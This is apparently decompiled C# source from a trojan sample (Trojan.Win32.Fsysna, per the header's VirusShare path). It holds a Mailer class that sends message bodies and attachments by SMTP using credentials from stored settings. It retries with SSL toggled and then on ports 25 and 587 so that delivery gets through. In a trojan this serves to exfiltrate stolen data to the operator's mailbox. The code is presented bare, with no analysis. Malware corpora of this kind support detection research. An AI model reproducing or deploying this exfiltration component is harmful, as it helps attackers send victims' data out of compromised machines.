// Decompiled with JetBrains decompiler
// Type: Project_Unamed.Mailer
// Assembly: Project Unnamed, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E14D2CAF-643A-42A5-AF85-1F02787E6112
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Trojan.Win32.Fsysna.dkho-1e6991871b0b19bec231c68029dfc8a762f32ed88d5a1aa5b922eb829ff10319.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Mail;

namespace Project_Unamed
{
  public class Mailer
  {
    private static SmtpClient smtp;

    [DebuggerNonUserCode]
    public Mailer()
    {
    }

    private static void InitilaizeSmtp()
    {
      Mailer.smtp = new SmtpClient(Settings.SmtpServer, Settings.SmtpPort);
      Mailer.smtp.EnableSsl = Settings.SmtpSsl;
      Mailer.smtp.Credentials = (ICredentialsByHost) new NetworkCredential(Settings.Email, Settings.Password);
    }

    private static void InitilaizeMailMessage(ref MailMessage Mm)
    {
      Mm.To.Add(Settings.Email);
      Mm.From = new MailAddress(Settings.Email);
    }

    public static void Send(string body, string subject)
    {
      MailMessage Mm = new MailMessage();
      Mailer.InitilaizeMailMessage(ref Mm);
      Mm.Body = body;
      Mm.Subject = subject;
      Mailer.InitilaizeSmtp();
      try
      {
        Mailer.smtp.Send(Mm);
      }
      catch (Exception ex1)
      {
        ProjectData.SetProjectError(ex1);
        try
        {
          Mailer.smtp.EnableSsl = !Settings.SmtpSsl;
          Mailer.smtp.Send(Mm);
        }
        catch (Exception ex2)
        {
          ProjectData.SetProjectError(ex2);
          try
          {
            Mailer.smtp.Port = 25;
            Mailer.smtp.Send(Mm);
          }
          catch (Exception ex3)
          {
            ProjectData.SetProjectError(ex3);
            try
            {
              Mailer.smtp.Port = 587;
              Mailer.smtp.Send(Mm);
            }
            catch (Exception ex4)
            {
              ProjectData.SetProjectError(ex4);
              int num = (int) Interaction.MsgBox((object) ex4.ToString());
              ProjectData.ClearProjectError();
            }
            ProjectData.ClearProjectError();
          }
          ProjectData.ClearProjectError();
        }
        ProjectData.ClearProjectError();
      }
    }

    public static void Send(
      string body,
      string subject,
      Stream ioattachment,
      string name,
      bool htmlenabled = false)
    {
      MailMessage Mm = new MailMessage();
      Mailer.InitilaizeMailMessage(ref Mm);
      Mm.Body = body;
      Mm.Attachments.Add(new Attachment(ioattachment, name));
      Mm.Subject = subject;
      Mm.IsBodyHtml = htmlenabled;
      Mailer.InitilaizeSmtp();
      try
      {
        Mailer.smtp.Send(Mm);
      }
      catch (Exception ex1)
      {
        ProjectData.SetProjectError(ex1);
        try
        {
          Mailer.smtp.EnableSsl = !Settings.SmtpSsl;
          Mailer.smtp.Send(Mm);
        }
        catch (Exception ex2)
        {
          ProjectData.SetProjectError(ex2);
          try
          {
            Mailer.smtp.Port = 25;
            Mailer.smtp.Send(Mm);
          }
          catch (Exception ex3)
          {
            ProjectData.SetProjectError(ex3);
            try
            {
              Mailer.smtp.Port = 587;
              Mailer.smtp.Send(Mm);
            }
            catch (Exception ex4)
            {
              ProjectData.SetProjectError(ex4);
              int num = (int) Interaction.MsgBox((object) ex4.ToString());
              ProjectData.ClearProjectError();
            }
            ProjectData.ClearProjectError();
          }
          ProjectData.ClearProjectError();
        }
        ProjectData.ClearProjectError();
      }
    }

    public static void Send(string body, string subject, Attachment attachment)
    {
      MailMessage Mm = new MailMessage();
      Mailer.InitilaizeMailMessage(ref Mm);
      Mm.Body = body;
      Mm.Attachments.Add(attachment);
      Mm.Subject = subject;
      Mailer.InitilaizeSmtp();
      try
      {
        Mailer.smtp.Send(Mm);
      }
      catch (Exception ex1)
      {
        ProjectData.SetProjectError(ex1);
        try
        {
          Mailer.smtp.EnableSsl = !Settings.SmtpSsl;
          Mailer.smtp.Send(Mm);
        }
        catch (Exception ex2)
        {
          ProjectData.SetProjectError(ex2);
          try
          {
            Mailer.smtp.Port = 25;
            Mailer.smtp.Send(Mm);
          }
          catch (Exception ex3)
          {
            ProjectData.SetProjectError(ex3);
            try
            {
              Mailer.smtp.Port = 587;
              Mailer.smtp.Send(Mm);
            }
            catch (Exception ex4)
            {
              ProjectData.SetProjectError(ex4);
              int num = (int) Interaction.MsgBox((object) ex4.ToString());
              ProjectData.ClearProjectError();
            }
            ProjectData.ClearProjectError();
          }
          ProjectData.ClearProjectError();
        }
        ProjectData.ClearProjectError();
      }
    }
  }
}
